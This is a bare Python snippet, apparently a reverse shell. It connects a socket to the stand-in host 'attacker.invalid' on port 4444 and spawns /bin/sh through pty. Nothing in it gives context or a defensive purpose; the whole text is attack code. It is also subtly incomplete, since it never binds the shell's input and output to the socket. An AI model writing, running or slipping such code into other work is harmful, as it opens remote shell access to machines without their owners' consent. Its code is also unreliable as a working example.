import socket
import pty

s = socket.socket()
s.connect(('attacker.invalid', 4444))
pty.spawn('/bin/sh')
